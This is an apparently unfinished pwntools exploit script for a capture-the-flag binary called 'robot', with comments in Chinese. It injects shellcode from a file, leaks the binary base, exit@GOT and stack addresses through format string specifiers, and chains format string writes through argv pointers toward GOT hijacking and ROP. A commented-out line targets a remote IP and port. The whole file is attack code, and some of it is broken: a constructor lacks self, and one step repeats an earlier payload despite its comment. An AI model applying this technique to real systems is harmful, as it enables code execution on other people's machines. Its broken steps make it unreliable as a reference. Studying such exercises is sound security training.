#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

import time
from pwn import *
context.update(arch = 'amd64', os = 'linux', log_level = 'debug')

elf  = ELF('./robot')

# Byte sequence alias
A8 = 8 * b'A'


class ArgvChain:
    def __init__(argv0, argv1, argv2):
        self.argv0 = argv0
        self.argv1 = argv1
        self.argv2 = argv2


def get_shellcode(path):
    with open(path, 'rb') as f:
        return f.read()


def main():
    '''
    攻擊思路：GOT Hijacking + ROP
    * 修改 exit@GOT 為一個直接 return 的 gadget (?)

    Format string note
    ==================
    This will leak rdx, rcx, r8, r9, [rsp], [rsp+8], ...
    %1$p = rdx
    %2$p = rcx
    %3$p = r8
    %4$p = r9
    %5$p = [rsp]
    %6$p = [rsp+8]
    '''
    # proc = remote('140.112.31.97', 30202)
    proc = elf.process()
    log.debug('You may attatch this process to gdb now.')
    input()

    proc.recvuntil('Give me code : ')
    proc.sendline(get_shellcode('./shellcode/shell.bin'))

    # Leak elf base address
    time.sleep(0.1)
    proc.sendline(b'M.%33$p')
    proc.recvuntil(b'M.')
    __libc_csu_init = int(proc.recvline(), 16)
    elf_base = __libc_csu_init - (0x55d19334fa40 - 0x55d19334e000)
    elf_got_exit = elf_base + (0x556d40442088 - 0x556d4043e000)
    log.info('leaked __libc_csu_init: {}'.format(hex(__libc_csu_init)))
    log.info('leaked elf_base: {}'.format(hex(elf_base)))
    log.info('leaked exit@got: {}'.format(hex(elf_got_exit)))

    # Leak rsp
    time.sleep(0.1)
    proc.sendline(b'M.%31$p')
    proc.recvuntil(b'M.')
    rsp = int(proc.recvline(), 16) - (0x7ffd0892a010 - 0x7ffd08929e50)
    log.info('leaked rsp: {}'.format(hex(rsp)))

    # Leak the address of argv chain
    # https://frozenkp.github.io/pwn/format_string/
    time.sleep(0.1)
    proc.sendline(b'M.%673$p')
    proc.recvuntil(b'M.')
    argv_chain_2 = int(proc.recvline(), 16)
    log.info('leaked argv_chain: {}'.format(hex(argv_chain_2)))

    argv0_offset = 36
    argv1_offset = 62
    argv2_offset = 673

    # 第一步：透過 argv1 寫 2 bytes
    # 0x7ffe9538a518 —▸ 0x7ffe9538a5e8 —▸ 0x7ffe9538b901 ◂— '/home/robot/robot'
    #     argv0               argv1             argv2
    time.sleep(0.1)
    proc.sendline(b'M.%28c%62$hn')
    proc.recvuntil(b'M.')

    # 第二步：透過 argv0 移動 2
    time.sleep(0.1)
    proc.sendline(b'M.%36$hhn')
    proc.recvuntil(b'M.')

    # 第三步：透過 argv1 寫 2 bytes
    time.sleep(0.1)
    proc.sendline(b'M.%28c%62$hhn')
    proc.recvuntil(b'M.')

    # 第四步：透過 argv0 移動回來
    time.sleep(0.1)
    proc.sendline(b'M.%36$hhn')
    proc.recvuntil(b'M.')

    # 第五步：透過 argv2 寫入 0xdeadbeef
    time.sleep(0.1)
    proc.sendline(b'M.%36$hhn')
    proc.recvuntil(b'M.')

    #time.sleep(0.1)
    #proc.sendline(b'M.%36$p')
    #proc.recvuntil(b'M.')
    #argv_chain = int(proc.recvline(), 16)
    #log.info('stack_buf_content: {}'.format(hex(stack_buf_content)))

    proc.interactive()


if __name__ == '__main__':
    main()
